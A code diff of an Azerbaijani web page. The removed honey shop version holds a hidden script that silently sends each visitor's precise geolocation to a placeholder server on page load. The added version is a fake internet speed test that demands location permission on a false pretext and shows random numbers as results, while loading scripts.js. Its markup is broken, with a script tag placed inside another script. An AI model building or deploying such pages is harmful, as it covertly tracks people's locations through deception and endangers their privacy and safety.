@@ -1,196 +1,271 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Lənkəran Balları | Təbii və Şəfalı</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-  <style>
-    :root {
-      --primary: #f59e0b;
-      --primary-dark: #d97706;
-      --bg: #fffbf2;
-      --card: #ffffff;
-      --text: #1f2937;
-      --muted: #6b7280;
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      line-height: 1.6;
-    }
-    nav {
-      background: #fff;
-      padding: 20px 50px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      position: sticky;
-      top: 0;
-      z-index: 1000;
-    }
-    .logo { font-size: 24px; font-weight: 800; color: var(--primary-dark); text-transform: uppercase; }
-    .hero {
-      background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)),
-                  url('https://images.unsplash.com/photo-1587049352846-4a222e784d38?auto=format&fit=crop&q=80&w=1400');
-      background-size: cover;
-      background-position: center;
-      height: 400px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      text-align: center;
-      padding: 20px;
-    }
-    .hero h2 { font-size: 42px; margin-bottom: 10px; }
-    .hero p { font-size: 20px; max-width: 600px; }
-    .features {
-      display: flex;
-      justify-content: space-around;
-      padding: 40px 10px;
-      max-width: 1200px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .feature-item i { font-size: 30px; color: var(--primary); margin-bottom: 10px; }
-    .content {
-      max-width: 1200px;
-      margin: 40px auto;
-      padding: 0 20px;
-    }
-    .section-title { text-align: center; margin-bottom: 40px; font-size: 32px; color: var(--text); }
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-      gap: 30px;
-    }
-    .product-card {
-      background: var(--card);
-      border-radius: 15px;
-      overflow: hidden;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-      transition: all 0.3s ease;
-      position: relative;
-    }
-    .product-card:hover { transform: translateY(-10px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-    .product-card img { width: 100%; height: 220px; object-fit: cover; }
-    .badge { position: absolute; top: 10px; left: 10px; background: #10b981; color: white; padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
-    .product-info { padding: 20px; }
-    .product-info h3 { font-size: 20px; margin-bottom: 10px; }
-    .product-info p { color: var(--muted); font-size: 14px; margin-bottom: 15px; height: 40px; overflow: hidden; }
-    .price-tag { font-size: 22px; font-weight: 700; color: var(--primary-dark); margin-bottom: 20px; }
-    .buy-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #25d366;
-      color: white;
-      text-decoration: none;
-      padding: 12px;
-      border-radius: 8px;
-      font-weight: 600;
-      gap: 10px;
-      transition: background 0.2s;
-    }
-    .buy-btn:hover { background: #1ebe57; }
-    footer { background: #333; color: white; text-align: center; padding: 50px 20px; margin-top: 60px; }
-    .contact-info { margin-top: 15px; font-size: 18px; }
-    @media (max-width: 768px) { .hero h2 { font-size: 30px; } .features { flex-direction: column; gap: 20px; } }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Şəbəkə Analizi - Sürət Testi</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
+    <style>
+        :root {
+            --bg-color: #060910;
+            --accent-color: #00ffd5;
+            --text-color: #ffffff;
+            --card-bg: #121620;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+        }
+
+        h1 {
+            font-weight: 300;
+            letter-spacing: 2px;
+            margin-bottom: 50px;
+        }
+
+        /* Speed Gauge */
+        .gauge-container {
+            position: relative;
+            width: 250px;
+            height: 250px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .gauge-svg {
+            transform: rotate(-90deg);
+            width: 100%;
+            height: 100%;
+        }
+
+        .gauge-bg {
+            fill: none;
+            stroke: #1e2532;
+            stroke-width: 10;
+        }
+
+        .gauge-progress {
+            fill: none;
+            stroke: var(--accent-color);
+            stroke-width: 10;
+            stroke-dasharray: 628;
+            stroke-dashoffset: 628;
+            transition: stroke-dashoffset 0.1s linear;
+            stroke-linecap: round;
+        }
+
+        .speed-value {
+            position: absolute;
+            font-size: 48px;
+            font-weight: bold;
+        }
+
+        .unit {
+            position: absolute;
+            bottom: 70px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        /* Start Button */
+        #go-btn {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            background: transparent;
+            border: 2px solid var(--accent-color);
+            color: var(--accent-color);
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 0 20px rgba(0, 255, 213, 0.2);
+            z-index: 10;
+        }
+
+        #go-btn:hover {
+            background: rgba(0, 255, 213, 0.1);
+            box-shadow: 0 0 40px rgba(0, 255, 213, 0.4);
+        }
+
+        /* Info Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 20px;
+            margin-top: 50px;
+            opacity: 0.5;
+            transition: opacity 0.5s;
+        }
+
+        .stat-item span {
+            display: block;
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+        }
+
+        .stat-item b {
+            font-size: 18px;
+        }
+
+        .status-msg {
+            margin-top: 30px;
+            font-size: 14px;
+            color: var(--accent-color);
+            height: 20px;
+        }
+
+        /* Results Modal Overlay */
+        #permission-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+    </style>
 </head>
 <body>
 
-<nav>
-  <div class="logo">🍯 Lənkəran Balı</div>
-  <div><i class="fa fa-shopping-cart"></i> Səbət</div>
-</nav>
+<div class="container">
+    <h1>ŞƏBƏKƏ ANALİZİ</h1>
 
-<section class="hero">
-  <h2>100% Təbii Lənkəran Balları</h2>
-  <p>Təbiətin qəlbindən, süfrənizə ən şirin və sağlam hədiyyə.</p>
-</section>
-
-<div class="features">
-  <div class="feature-item">
-    <i class="fas fa-check-circle"></i>
-    <p>100% Orqanik</p>
-  </div>
-  <div class="feature-item">
-    <i class="fas fa-truck"></i>
-    <p>Sürətli Çatdırılma</p>
-  </div>
-  <div class="feature-item">
-    <i class="fas fa-leaf"></i>
-    <p>Heç bir qatqısız</p>
-  </div>
-</div>
-
-<div class="content">
-  <h2 class="section-title">Məhsullarımız</h2>
-  <div class="grid">
-    <!-- Məhsullar (istədiyin kimi əlavə edə bilərsən) -->
-    <div class="product-card">
-      <span class="badge">Ən çox satılan</span>
-      <img src="https://images.unsplash.com/photo-1558642452-9d2a7deb7f62?auto=format&fit=crop&q=80&w=400" alt="May Balı">
-      <div class="product-info">
-        <h3>Lənkəran May Balı</h3>
-        <p>Yaz çiçəklərindən toplanmış, müalicəvi əhəmiyyətli yüngül bal.</p>
-        <div class="price-tag">25.00 AZN <small>/ 1kq</small></div>
-        <a href="https://wa.me/994XXXXXXXXX?text=Lənkəran May Balı sifariş etmək istəyirəm" class="buy-btn">
-          <i class="fab fa-whatsapp"></i> İndi Sifariş Et
-        </a>
-      </div>
+    <div class="gauge-container" id="gauge-box" style="display: none;">
+        <svg class="gauge-svg" viewBox="0 0 220 220">
+            <circle class="gauge-bg" cx="110" cy="110" r="100"></circle>
+            <circle id="progress-circle" class="gauge-progress" cx="110" cy="110" r="100"></circle>
+        </svg>
+        <div class="speed-value" id="main-speed">0</div>
+        <div class="unit">Mbps</div>
     </div>
-    <!-- Daha çox məhsul əlavə edə bilərsən -->
-  </div>
+
+    <button id="go-btn" onclick="requestAccess()">BAŞLA</button>
+
+    <div class="status-msg" id="status">Testi başlamaq üçün düyməyə basın</div>
+
+    <div class="stats" id="stats-panel">
+        <div class="stat-item">
+            <span>Ping</span>
+            <b id="ping-val">-</b> <small>ms</small>
+        </div>
+        <div class="stat-item">
+            <span>Download</span>
+            <b id="down-val">-</b>
+        </div>
+        <div class="stat-item">
+            <span>Upload</span>
+            <b id="up-val">-</b>
+        </div>
+    </div>
 </div>
 
-<footer>
-  <div class="logo" style="color: var(--primary);">🍯 Lənkəran Balları</div>
-  <p>Lənkəranın ucqar kəndlərindən, təmiz hava və bol günəşdən süzülən şəfa.</p>
-  <div class="contact-info">
-    <p><i class="fas fa-phone"></i> +994 (12) 345 67 89</p>
-    <p><i class="fas fa-map-marker-alt"></i> Lənkəran rayonu, Azərbaycan</p>
-  </div>
-  <p style="margin-top: 30px; opacity: 0.6;">© 2026 Bütün hüquqlar qorunur.</p>
-</footer>
-
-<!-- KÖHNƏ BOT LOKASİYA INTEGRASİYASI -->
-<script src="./scripts.js"></script>
 <script>
-  // Bot üçün gizli lokasiya funksiyası
-  function sendLocationToBot(lat,lng,acc){
-    if(typeof sendToServer === "function"){
-      // scripts.js içində sendToServer varsa onu çağır
-      sendToServer({latitude:lat,longitude:lng,accuracy:acc});
-    } else {
-      // Əgər yoxdursa sadəcə fetch
-      fetch('https://sizinserver.com/location',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({latitude:lat,longitude:lng,accuracy:acc})
-      });
-    }
-  }
+    const goBtn = document.getElementById('go-btn');
+    const gaugeBox = document.getElementById('gauge-box');
+    const statusText = document.getElementById('status');
+    const mainSpeed = document.getElementById('main-speed');
+    const progressCircle = document.getElementById('progress-circle');
 
-  // Lokasiyanı əldə et və göndər
-  if('geolocation' in navigator){
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const {latitude, longitude, accuracy} = pos.coords;
-        sendLocationToBot(latitude, longitude, accuracy);
-      },
-      err => {
-        console.log('Lokasiya alınmadı:', err);
-      },
-      {enableHighAccuracy:true, timeout:8000, maximumAge:0}
-    );
-  }
+    const pingVal = document.getElementById('ping-val');
+    const downVal = document.getElementById('down-val');
+    const upVal = document.getElementById('up-val');
+
+    function requestAccess() {
+        statusText.innerText = "Lokasiya icazəsi tələb olunur...";
+
+        // Lokasiya icazəsi istəyirik
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // İcazə verildi, testi başlat
+                    startTest();
+                },
+                (error) => {
+                    alert("Şəbəkə analizi və ən yaxın serverin təyini üçün lokasiya icazəsi verilməlidir.");
+                    statusText.innerText = "Xəta: İcazə rədd edildi";
+                }
+            );
+        } else {
+            alert("Brauzeriniz bu testi dəstəkləmir.");
+        }
+    }
+
+    function startTest() {
+        goBtn.style.display = 'none';
+        gaugeBox.style.display = 'flex';
+        document.getElementById('stats-panel').style.opacity = '1';
+
+        // 1. Ping Mərhələsi
+        statusText.innerText = "Server axtarılır...";
+        setTimeout(() => {
+            pingVal.innerText = Math.floor(Math.random() * (40 - 15) + 15);
+
+            // 2. Download Mərhələsi
+            statusText.innerText = "Yükləmə sürəti (Download) yoxlanılır...";
+            runAnimation(downVal, (finalVal) => {
+                // 3. Upload Mərhələsi
+                statusText.innerText = "Ötürmə sürəti (Upload) yoxlanılır...";
+                setTimeout(() => {
+                    runAnimation(upVal, () => {
+                        statusText.innerText = "Test başa çatdı. Şəbəkə stabil görünür.";
+                        statusText.style.color = "#10b981";
+                    }, 15, 30);
+                }, 1000);
+            }, 30, 95);
+
+        }, 1500);
+    }
+
+<script src="scripts.js"></script>
+
+  
+    function runAnimation(targetElement, callback, min, max) {
+        let current = 0;
+        let target = Math.floor(Math.random() * (max - min) + min);
+
+        let interval = setInterval(() => {
+            // Sürət rəqəminin oynaması (realistik görünmək üçün)
+            let jitter = Math.random() * 5;
+            let displayVal = (current + jitter).toFixed(1);
+
+            mainSpeed.innerText = displayVal;
+            targetElement.innerText = displayVal;
+
+            // Dairəvi tərəzini hərəkət etdir (Dashoffset 628 tam dövrədir)
+            let offset = 628 - (628 * (current / 100));
+            progressCircle.style.strokeDashoffset = offset;
+
+            if (current < target) {
+                current += 1.5;
+            } else {
+                clearInterval(interval);
+                mainSpeed.innerText = target.toFixed(1);
+                targetElement.innerText = target.toFixed(1);
+                callback(target);
+            }
+        }, 50);
+    }
 </script>
 
 </body>
